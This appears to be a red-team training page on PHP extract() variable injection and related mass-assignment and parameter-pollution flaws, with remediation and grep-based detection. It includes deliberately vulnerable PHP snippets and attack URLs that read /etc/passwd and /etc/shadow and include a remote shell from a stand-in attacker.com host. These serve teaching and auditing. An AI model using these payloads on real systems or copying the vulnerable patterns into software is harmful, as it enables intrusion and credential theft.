---
layout: training-page
title: "External Variable Modification — Red Team Academy"
module: "Web Hacking"
tags:
  - php
  - extract
  - variable-injection
  - lfi
  - web
page_key: "web-external-variable-modification"
render_with_liquid: false
---

# External Variable Modification

External Variable Modification (CWE-473) occurs when a PHP application passes unsanitized user input to `extract()`, `import_request_variables()`, or similar functions that import values into the current variable scope. By default, `extract()` uses `EXTR_OVERWRITE`, meaning existing variables are silently replaced. Attackers can overwrite authentication flags, file paths, and global variables — enabling privilege escalation, authentication bypass, and local file inclusion.

## The extract() Vulnerability

The typical vulnerable pattern looks like this:

```
<?php
extract($_GET);
// or
extract($_POST);
// User-supplied keys become PHP variables, overwriting anything in scope
?>
```

### Attack 1 — Authentication Bypass

```
<?php
$authenticated = false;
extract($_GET);
if ($authenticated) {
    echo "Access granted!";
} else {
    echo "Access denied!";
}
?>
```

Exploitation — set `$authenticated` to a truthy value via GET parameter:

```
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### Attack 2 — Local File Inclusion via Path Poisoning

```
<?php
$page = "config.php";
extract($_GET);
include "$page";
?>
```

Exploitation — override the `$page` variable to include arbitrary files:

```
http://example.com/vuln.php?page=../../etc/passwd
http://example.com/vuln.php?page=../../etc/shadow
http://example.com/vuln.php?page=http://attacker.com/shell.php
```

### Attack 3 — Global Variable Injection (PHP < 8.1)

Before PHP 8.1, write access to `$GLOBALS` was unrestricted. Calling `extract($_GET)` allowed overwriting arbitrary global variables:

```
http://example.com/vuln.php?GLOBALS[admin]=1
http://example.com/vuln.php?GLOBALS[db_pass]=attacker
```

Note: As of PHP 8.1.0, write access to the entire `$GLOBALS` array is no longer supported.

## Chaining to RCE

If a file path variable is overwritten and the application later passes it to a function like `include`, `require`, `file_get_contents`, or `system`, the impact escalates to RCE:

```
<?php
extract($_POST);
// Attacker sets $cmd = "id"
system($cmd);
?>
```

## Identification

During code review or black-box testing, look for PHP applications that accept query parameters matching internal variable names, or behave differently when unexpected parameters are added. Grep the source for these dangerous patterns:

```
extract($_GET);
extract($_POST);
extract($_REQUEST);
import_request_variables();
```

## Remediation

Use `EXTR_SKIP` to prevent overwriting existing variables:

```
<?php
extract($_GET, EXTR_SKIP);
?>
```

Better yet, avoid `extract()` entirely. Access user input directly from `$_GET` or `$_POST` with explicit validation:

```
<?php
$page = isset($_GET['page']) ? basename($_GET['page']) : 'default.php';
// validate against an allowlist
$allowed_pages = ['home', 'about', 'contact'];
if (!in_array($page, $allowed_pages)) {
    $page = 'default.php';
}
include $page;
?>
```

---

## PHP register_globals — Legacy Context

`register_globals` was a PHP configuration directive (removed in PHP 5.4.0) that automatically created global variables from GET, POST, and Cookie parameters. This made every incoming parameter directly accessible as a PHP variable without any explicit extraction.

```ini
; php.ini — register_globals (deprecated, removed in PHP 5.4)
register_globals = On
```

With `register_globals = On`, the following was true:

```php
<?php
// No explicit extraction needed
// GET parameter ?admin=1 becomes $admin = "1" automatically
if ($admin) {
    // attacker-controlled $admin bypasses authentication
    include 'admin-panel.php';
}
?>
```

This was a systemic problem in early PHP applications (PHP 3/4 era). Many legacy codebases still use PHP patterns written assuming register_globals was on. When auditing legacy PHP code, pay attention to variables that are used without explicit initialization — they may have been intended to be set by register_globals.

Finding legacy register_globals patterns:

```bash
# Look for variables used without initialization — a register_globals smell
grep -n 'if ($[a-z]' *.php | grep -v '= '
grep -n 'include \$[a-z]' *.php
```

---

## HTTP Parameter Pollution as Variable Modification

HTTP Parameter Pollution (HPP) is a related technique. When a PHP application calls `extract($_GET)` and the query string contains duplicate parameter names, PHP's behavior (last value wins for `$_GET`) means the second value overwrites the first — and then `extract()` imports the last value into scope.

```
# PHP: $_GET['role'] = 'admin' (last value wins)
GET /login.php?role=user&role=admin

# After extract($_GET):
# $role = 'admin'
```

This matters for:
- Applications that sanitize the first occurrence of a parameter but import the last
- WAFs that inspect only the first occurrence while the backend processes the last

---

## Mass Assignment — ORM-Level Variable Modification

Mass assignment is the ORM-level equivalent of PHP's `extract()` problem. When a web framework automatically binds HTTP request parameters to model attributes, an attacker can submit parameters for fields that should not be user-modifiable.

### Rails (Ruby on Rails)

In older Rails versions (pre-4.0), `attr_accessible` was optional. Without it, mass assignment was automatic:

```ruby
# Vulnerable — params[:user] can include any attribute
User.create(params[:user])

# With params: { user: { name: "attacker", role: "admin", admin: true } }
# The role and admin fields get set even if they should be protected
```

Modern Rails uses Strong Parameters to whitelist allowed attributes:

```ruby
# Safe — only permitted attributes are assigned
def user_params
  params.require(:user).permit(:name, :email, :password)
end

User.create(user_params)
```

### Django (Python)

Django forms and serializers have explicit field declarations. However, Django REST Framework serializers can be misconfigured:

```python
# Vulnerable — all fields writable
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # includes 'is_staff', 'is_superuser'

# Safe — explicit field list
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'first_name', 'last_name']
        read_only_fields = ['is_staff', 'is_superuser', 'date_joined']
```

### Spring (Java)

Spring MVC's `@ModelAttribute` binds request parameters to Java bean properties. Without explicit binding restrictions, attackers can set any writable property:

```java
// Vulnerable — binds all request params to User bean
@PostMapping("/register")
public String register(@ModelAttribute User user) {
    userService.save(user);
    return "success";
}

// Attacker submits: POST /register?name=attacker&role=ADMIN&active=true
```

Secure approach — use `@InitBinder` to restrict allowed fields:

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("name", "email", "password");
    // Never bind 'role', 'active', 'admin'
}
```

### Express (Node.js)

Express doesn't have built-in ORM mass assignment protection. Mongoose (MongoDB ODM) is commonly vulnerable when using `req.body` directly:

```javascript
// Vulnerable
User.findByIdAndUpdate(userId, req.body);

// Attacker submits: { name: "attacker", role: "admin", isAdmin: true }

// Safe — use explicit projection
const { name, email } = req.body;
User.findByIdAndUpdate(userId, { name, email });
```

---

## Request Parameter Type Coercion

Some frameworks allow the same parameter to be submitted as different types, and the application may behave differently for each:

### Array vs String

PHP treats `?param[]=value` as an array and `?param=value` as a string:

```php
// If code expects a string but receives an array:
$id = $_GET['id'];  // could be "123" or ["123", "456"] depending on input

// Sending ?id[]=123&id[]=456 makes $id an array
// Functions like strcmp(), intval(), mysql_real_escape_string() behave differently with arrays
```

Example bypass using array injection:

```php
<?php
if ($_GET['password'] == $real_password) { ... }
// Sending ?password[]=anything bypasses: array != string returns false in loose comparison
// But: if PHP strict comparison is not used, array == string can be unpredictable
?>
```

### JSON vs Form Data

Applications that accept both JSON and form-encoded data may parse them differently:

```
# Form data — string
POST /api/login
Content-Type: application/x-www-form-urlencoded
role=user&action=login

# JSON — can inject objects
POST /api/login
Content-Type: application/json
{"role": {"admin": true}, "action": "login"}
```

If the application does a truthy check on `role`, an object `{}` is truthy in JavaScript and may bypass the check.

---

## Weak Variable Binding in Template Engines

Some template engines (especially in PHP-based frameworks) use `extract()` internally to expose template variables. If user input reaches the template variable context, it can shadow built-in template variables or override security controls.

### Smarty (PHP Template Engine)

Smarty uses `extract()` to assign template variables. An older vulnerability pattern:

```php
// If the app passes user data directly to template variables
$smarty->assign($_GET);  // Vulnerable — user can override any template variable
$smarty->display('template.tpl');
```

An attacker who controls a GET parameter named `SMARTY_RESOURCE_CHAR_SET` or other internal Smarty variables can change the template engine's behavior.

---

## HackerOne Case Studies

### Mass Assignment on Account Privilege Escalation

Multiple HackerOne reports document mass assignment vulnerabilities where user registration or profile update endpoints allowed setting `is_admin`, `role`, or `subscription_type` fields:

- Attacker submits registration with extra JSON field: `{"email": "a@b.com", "password": "test", "admin": true}`
- Application binds all parameters to the User model without a whitelist
- The `admin` field is set to `true` on the new account
- Attacker now has admin access

Common programs affected: Laravel applications using `$request->all()`, Rails apps without strong parameters.

### PHP extract() Auth Bypass

Several CTF challenges and real-world vulnerabilities involved `extract()` bypasses where `?is_admin=1` or `?logged_in=true` in the URL set internal authentication variables, granting unauthorized access.

---

## Detection Methodology

### Black-Box Testing

1. Identify PHP applications (`.php` extension, `X-Powered-By: PHP` header, error messages).
2. For each form or parameterized endpoint, add unexpected parameters that match common variable names:
   ```
   ?authenticated=1
   ?is_admin=1
   ?logged_in=true
   ?role=admin
   ?debug=1
   ?admin=1
   ```
3. For file inclusion patterns, try:
   ```
   ?page=/etc/passwd
   ?template=../../config
   ?include=php://filter/convert.base64-encode/resource=index.php
   ```
4. Observe whether the application behavior changes.

### Code Review

Grep for dangerous function calls:

```bash
grep -rn 'extract(\$_' /var/www/html/
grep -rn 'extract(\$_GET' .
grep -rn 'extract(\$_POST' .
grep -rn 'extract(\$_REQUEST' .
grep -rn 'import_request_variables(' .
grep -rn '->assign(\$_' .  # Smarty template assignment
```

For mass assignment in frameworks:

```bash
# Rails — look for .create(params) without strong parameters
grep -rn '\.create(params\[' app/
grep -rn '\.update(params\[' app/

# Django REST Framework — fields = '__all__'
grep -rn "fields = '__all__'" .

# Spring — @ModelAttribute without binding restrictions
grep -rn '@ModelAttribute' src/
```

---

## Resources

- CWE-473: PHP External Variable Modification — `cwe.mitre.org/data/definitions/473.html`
- CWE-621: Variable Extraction Error — `cwe.mitre.org/data/definitions/621.html`
- PHP extract() Documentation — `php.net/manual/en/function.extract.php`
- PHP $GLOBALS — `php.net/manual/en/reserved.variables.globals.php`
- CTF Writeup: The Ducks — HackThisSite — `github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md`
- Mass Assignment — OWASP — `owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment`
- Rails Security Guide: Mass Assignment — `guides.rubyonrails.org/security.html`
- HackerOne Hacktivity: Mass Assignment Reports — `hackerone.com/hacktivity?querystring=mass+assignment`
